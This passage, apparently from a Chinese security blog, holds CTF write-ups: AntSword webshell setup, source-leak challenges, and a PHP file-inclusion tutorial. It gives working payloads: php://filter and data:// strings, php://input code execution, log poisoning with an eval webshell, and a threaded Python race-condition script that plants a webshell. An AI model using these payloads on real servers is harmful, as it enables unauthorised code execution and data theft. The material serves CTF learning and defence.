class="hljs-number">152</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>中国蚁剑</title>
    <link href="/2025/01/08/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    <url>/2025/01/08/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</url>
    
    <content type="html"><![CDATA[<p>使用流程：</p><ol><li><strong>添加数据</strong>：打开蚁剑 → 点击 “添加数据”</li><li>配置连接<ul><li><strong>URL</strong>：填入包含日志的 URL（如<code>http://靶场IP/vulnerable.php?file=/var/log/nginx/access.log</code>）</li><li><strong>密码</strong>：填入<code>cmd</code>（对应木马中的<code>$_POST[&#39;cmd&#39;]</code>）</li><li><strong>编码器</strong>：选择<code>UTF-8</code></li></ul></li><li><strong>测试连接</strong>：点击 “测试连接”，成功后即可管理服务器文件、执行命令。</li></ol><p><img src="/images/%E8%9A%81%E5%89%911.png"></p><p><img src="/images/%E8%9A%81%E5%89%912.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2025/01/07/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2025/01/07/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><strong>phps文件</strong>就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。直接访问&#x2F;index.phps即可获得php</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>www源码泄露</p><p>访问url&#x2F;<a href="http://www.zip,通过其源码泄露,发现index.php文件/">www.zip，通过其源码泄露，发现index.php文件</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-01 14:37:13</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-01 14:42:44</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//flag in fl000g.txt</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;web6:where is flag?&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>fl000g.txt里显示flag{flag_here}，尝试直接url&#x2F;fl000g.txt，得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。<br>当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露漏洞。</p><p>尝试&#x2F;.git得到flag</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>主流的版本控制器有git和svn，访问&#x2F;.svn得到flag</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件.</p><ul><li>第一次意外退出生成的是.swp</li><li>第二次意外退出生成的是.swo</li><li>第三次为.swn</li></ul><p>访问&#x2F;index.php.swp获得带有flag的文件</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问&#x2F;admin，弹出登陆界面，账号用admin，密码从网站里找</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问&#x2F;editor，是文件上传界面，点击文件空间，从var&#x2F;www&#x2F;html找到nothinghere，点进去是fl000g.txt，访问&#x2F;nothinghere&#x2F;fl000g.txt得到flag</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>登录界面找回密保问题，通过文章里的qq邮箱得到居住地，成功找回密码。</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问tz.php找到flag</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫到backup.sql得到flag</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote><p>玩101分给你flag</p></blockquote><p>找到js文件，看见大于100分输出的字符串，解码获得flag</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件从txt打开，虽然是乱码也可以搜到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/01/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/01/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="文件包含函数-php"><a href="#文件包含函数-php" class="headerlink" title="文件包含函数(php):"></a>文件包含函数(php):</h2><p><strong>include($file)</strong>:包含文件，出错时仅报警告（E_WARNING），程序继续执行。</p><p><strong>require($file)</strong>:包含文件，出错时报致命错误（E_COMPILE_ERROR），程序终止。</p><p><strong>include_once($file)</strong>:与 include 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>require_once($file)</strong>:与 require 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>file_get_contents($file)</strong>:读取整个文件内容到字符串，可配合 allow_url_fopen 读取远程文件。</p><h2 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数:"></a>动态执行函数:</h2><p><strong>eval($code)</strong>:执行字符串形式的 PHP 代码（如 eval(“echo ‘hello’;”);）。</p><p><strong>system($cmd)</strong>:执行系统命令并输出结果（如 system(“ls -l”);）。</p><p><strong>exec($cmd)</strong>:执行系统命令并返回结果的最后一行（如 exec(“whoami”);）。</p><p><strong>shell_exec($cmd)</strong>:通过 shell 执行命令，返回完整输出（如 <code>ls -l</code> 或 shell_exec(“ls”);）。</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议是 PHP 提供的流封装器（Stream Wrappers），允许通过标准文件函数（如 include、file_get_contents）访问：</p><p>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;路径&gt;（如 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php）</p><p>当存在文件包含漏洞时（如 include($_GET[‘file’])），伪协议能：</p><p>1.绕过路径限制<br>（无法直接包含非脚本文件时）</p><p>2.读取源码<br>（<strong>避免被 PHP 解析执行</strong>）</p><p>3.实现远程代码执行（<strong>RCE</strong>）<br>（无需文件上传）</p><p>4.利用压缩包&#x2F;临时文件<br>（隐藏恶意代码）</p><hr><h3 id="🌟-一句话理解伪协议"><a href="#🌟-一句话理解伪协议" class="headerlink" title="🌟 一句话理解伪协议"></a>🌟 一句话理解伪协议</h3><blockquote><p><strong>伪协议 &#x3D; 给PHP的「特殊指令」</strong><br>告诉它不要简单打开文件，而是用特殊方式处理文件（比如解码&#x2F;执行代码&#x2F;读取压缩包）</p></blockquote><hr><h3 id="🧩-文件包含漏洞是什么？"><a href="#🧩-文件包含漏洞是什么？" class="headerlink" title="🧩 文件包含漏洞是什么？"></a>🧩 文件包含漏洞是什么？</h3><p>假设有段危险代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">// 比如用户访问：http://site.com/?file=header.php</span><br></code></pre></td></tr></table></figure><p>黑客如果把<code>file</code>参数改成<strong>伪协议指令</strong>，就能让PHP执行危险操作！</p><hr><h3 id="🛠️-五大伪协议详解（新手版）"><a href="#🛠️-五大伪协议详解（新手版）" class="headerlink" title="🛠️ 五大伪协议详解（新手版）"></a>🛠️ 五大伪协议详解（新手版）</h3><h4 id="1️⃣-php-filter（文件内容阅读器）"><a href="#1️⃣-php-filter（文件内容阅读器）" class="headerlink" title="1️⃣ php://filter（文件内容阅读器）"></a>1️⃣ <code>php://filter</code>（文件内容阅读器）</h4><p><strong>作用</strong>：<strong>读取文件源代码</strong>（不让PHP执行它）<br><strong>使用场景</strong>：偷看网站的配置文件（数据库密码等）<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=php://filter/convert.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：看到<code>config.php</code>的Base64编码内容 → 解码后获得密码  </p><blockquote><p>📌 就像对快递员说：“别送包裹了！把里面的信<strong>拍照发我</strong>”（避免拆包裹触发炸弹）</p></blockquote><hr><h4 id="2️⃣-php-input（代码植入器）"><a href="#2️⃣-php-input（代码植入器）" class="headerlink" title="2️⃣ php://input（代码植入器）"></a>2️⃣ <code>php://input</code>（代码植入器）</h4><p><strong>作用</strong>：<strong>把POST请求体中的代码当作文件执行</strong><br><strong>使用场景</strong>：直接控制服务器执行命令</p><p><strong>用法</strong>：url加上php:&#x2F;&#x2F;input，同时post传参，bp抓包把post内容改成命令即可<br><strong>实战示例</strong>： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://site.com/?file=php://input&quot;</span> -d <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：服务器执行<code>ls</code>命令，列出文件  </p><blockquote><p>📌 就像把快递员打晕，<strong>把自己的炸弹塞进包裹</strong>让他配送</p></blockquote><hr><h4 id="3️⃣-data-（代码直插器）"><a href="#3️⃣-data-（代码直插器）" class="headerlink" title="3️⃣ data://（代码直插器）"></a>3️⃣ <code>data://</code>（代码直插器）</h4><p><strong>作用</strong>：<strong>直接在URL里写代码执行</strong><br><strong>使用场景</strong>：快速测试代码执行<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=data://text/plain,&lt;?php echo &#x27;HACKED!&#x27;; ?&gt;<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：页面显示 <code>HACKED!</code>  </p><blockquote><p>📌 就像打电话时说：“别收快递了！我<strong>现场给你个炸弹</strong>，立刻引爆！”</p></blockquote><hr><h4 id="4️⃣-zip-（压缩包提取器）"><a href="#4️⃣-zip-（压缩包提取器）" class="headerlink" title="4️⃣ zip://（压缩包提取器）"></a>4️⃣ <code>zip://</code>（压缩包提取器）</h4><p><strong>作用</strong>：<strong>执行压缩包里的PHP文件</strong><br><strong>使用场景</strong>：绕过文件上传检查<br><strong>实战步骤</strong>：</p><ol><li>创建 <code>shell.php</code> 内容 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code></li><li>压缩成 <code>evil.zip</code></li><li>上传到服务器</li><li>触发：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=zip:///var/www/uploads/evil.zip%23shell.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：执行压缩包中的恶意代码  </p><blockquote><p>📌 就像寄送<strong>伪装成玩具的炸弹</strong>，让快递员从玩具箱里取出炸弹</p></blockquote><hr><h4 id="5️⃣-phar-（高级压缩提取器）"><a href="#5️⃣-phar-（高级压缩提取器）" class="headerlink" title="5️⃣ phar://（高级压缩提取器）"></a>5️⃣ <code>phar://</code>（高级压缩提取器）</h4><p>类似 <code>zip://</code>，但支持更多格式（如PHAR、TAR）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=phar:///uploads/evil.phar/internal.php<br></code></pre></td></tr></table></figure><hr><h3 id="🛡️-为什么防御难？"><a href="#🛡️-为什么防御难？" class="headerlink" title="🛡️ 为什么防御难？"></a>🛡️ 为什么防御难？</h3><p>伪协议利用了PHP的<strong>合法功能</strong>，防御需主动关闭：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 在php.ini中关闭危险设置</span><br><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span><br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><hr><h2 id="本地文件包含漏洞（LFI-Local-File-Inclusion）"><a href="#本地文件包含漏洞（LFI-Local-File-Inclusion）" class="headerlink" title="本地文件包含漏洞（LFI, Local File Inclusion）"></a>本地文件包含漏洞（LFI, Local File Inclusion）</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1.&#x2F;?file&#x3D;..&#x2F;..&#x2F;flag.php 报错的原因:</strong></p><p> <em><strong>Warning</strong>:  include(&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p> <em><strong>Warning</strong>:  include(): Failed opening ‘&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php’ for inclusion (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p><strong>路径问题</strong>：..&#x2F;..&#x2F;flag.php 是相对路径，表示”向上两级目录中的flag.php”</p><p><strong>安全机制</strong>：PHP的 open_basedir 限制会阻止访问系统文件（常见于CTF环境）</p><p><strong>路径转换</strong>：PHP将相对路径转为绝对路径时，超出允许范围的路径会被替换为 &#x2F;…&#x2F;（安全占位符）</p><p><strong>根本原因</strong>：实际路径可能是 &#x2F;var&#x2F;www&#x2F;..&#x2F;..&#x2F;flag.php → 解析为 &#x2F;flag.php（根目录），而服务器禁止访问根目录</p><p><strong>关键点</strong>：这不是文件不存在，而是路径被安全机制拦截</p><p><strong>2.&#x2F;?file&#x3D;flag.php 显示空白的原因:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// flag.php 实际内容</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ctfshow&#123;...&#125;&quot;</span>;  <span class="hljs-comment">// 没有输出语句！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>include机制</strong>：当包含 .php 文件时，PHP会执行其中的代码，而非显示源码</p><p><strong>执行而非读取</strong>：</p><p>​    include(“flag.php”) 会执行 $flag&#x3D;”…” 的赋值操作</p><p>​    但该文件没有 echo&#x2F;print 语句 → 无任何输出</p><p>​    赋值操作在内存中完成，浏览器不可见</p><p><strong>空白页面</strong> &#x3D; 包含成功 + 文件无输出内容</p><p><strong>3.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php成功的原因：</strong></p><p><strong>绕过执行</strong>：</p><p>​    php:&#x2F;&#x2F;filter 将文件视为数据流而非代码</p><p>​    resource&#x3D;flag.php 指定读取目标文件</p><p><strong>编码转换</strong>：</p><p>​    convert.base64-encode 对文件内容进行Base64编码</p><p>​    将二进制数据转为纯ASCII字符（A-Z a-z 0-9 +&#x3D;）</p><p><strong>安全输出</strong>：</p><p>​    编码后的内容不包含 <?php ?> 等标签</p><p>​    PHP引擎将其视为普通文本而非代码 → 直接输出到页面</p><p><strong>最终结果</strong>：</p><p>​    页面显示Base64编码的源码：PD9waHAgJGZsYWc9ImN0ZnNob3d7…</p><p>​    解码后得到原始代码</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);</em> </p><p>改用base64编码php即可(没有&#x2F;i可以用大小写绕过)</p><p>获取flag： ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);   $file &#x3D; str_replace(“data”, “???”, $file);</em> </p><p>用input协议，?file&#x3D;Php:&#x2F;&#x2F;input，抓post包，把post改成php语句即可运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以直接大小写绕过</p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>可以不用伪协议，开始写马</p><p>在响应头的server中看见服务器为nginx，包含 nginx 访问日志记录：<strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p><p>Apache 默认的 combined 日志格式会 原样记录 User-Agent 字符串，不会进行 URL 解码或过滤特殊字符。所以我们改UA。直接添加<?php eval($_GET[2]);?></p><p>get改成**?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(‘tac fl0g.php’);**抓个get包，复制第一行替换原日志第一行即可获得flag</p><h3 id="web82-条件竞争"><a href="#web82-条件竞争" class="headerlink" title="web82(条件竞争)"></a>web82(条件竞争)</h3><p>过滤了.</p><p>php中唯一能控制的无后缀的只有session文件</p><p><img src="/%5Cimages%5Cweb82-1.png"></p><p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p><p>控制文件内容用参数<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>(获取实时文件上传进度)</p><p>如PHP_SESSION_UPLOAD_PROGRESS&#x3D;”3” &#x3D;&gt; sess_aaa&#x3D;3</p><p><strong>file_put_contents() 函数</strong>：</p><ul><li>这是PHP的一个内置函数</li><li>作用：将内容写入文件（类似保存文件的操作）</li><li>语法：<code>file_put_contents(文件名, 要写入的内容)</code></li><li>示例：<code>file_put_contents(&#39;test.txt&#39;, &#39;Hello World&#39;)</code> 会创建一个test.txt文件，内容为”Hello World”</li></ul><p>写脚本（<strong>已经考虑到了先销毁再包含的情况）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br>data = &#123; <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="hljs-comment"># read()中需要post的内容</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>            data=&#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        <span class="hljs-comment"># 改参数的值就是/tmp/sess_rikka文件的内容</span><br>            &#125;,<br>            cookies=&#123;<br>            <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid<br>            &#125;,<br>            files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>            )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid, data=data, cookies=&#123; <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid &#125;)<br>        res2 = session.get(url+<span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event() <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br><br></code></pre></td></tr></table></figure><p>50KB文件确保上传时间足够长（约几秒），这样攻击者有时间在文件被清空前利用它 </p><p>结果是+++done+++，说明成功，访问&#x2F;2.php，</p><p><img src="/%5Cimages%5Cweb82-2.png"></p><p>尝试post</p><p><img src="/%5Cimages%5Cweb82-3.png"></p><p>成功。下面详细讲解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br><span class="hljs-comment"># 目标网站的URL</span><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br><br><span class="hljs-comment"># 自定义的Session ID，用于控制Session文件名</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br><br><span class="hljs-comment"># 要执行的恶意PHP代码</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>data 解释</strong>：</p><ul><li><code>&quot;1&quot;</code>：这是POST参数名</li><li>值是一个PHP代码字符串：<code>file_put_contents(&#39;/var/www/html/2.php&#39;,&#39;&lt;?php eval($_POST[2]);?&gt;&#39;);</code></li><li>这行代码的意思是：在服务器的<code>/var/www/html/</code>目录创建<code>2.php</code>文件</li><li>文件内容：<code>&lt;?php eval($_POST[2]);?&gt;</code>（这是一个Webshell）</li><li><code>eval($_POST[2])</code> 表示执行通过POST参数<code>2</code>发送的任何PHP代码</li></ul><hr><h4 id="写线程函数（负责污染Session文件）"><a href="#写线程函数（负责污染Session文件）" class="headerlink" title="写线程函数（负责污染Session文件）"></a>写线程函数（负责污染Session文件）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-comment"># 创建一个50KB大小的&quot;假文件&quot;（内容全是字母a）</span><br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 发送POST请求上传文件</span><br>        res = session.post(<br>            url,  <span class="hljs-comment"># 目标URL</span><br>            <br>            <span class="hljs-comment"># POST数据部分</span><br>            data=&#123;<br>                <span class="hljs-comment"># 关键！这个值会被写入Session文件</span><br>                <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># Cookie设置</span><br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid 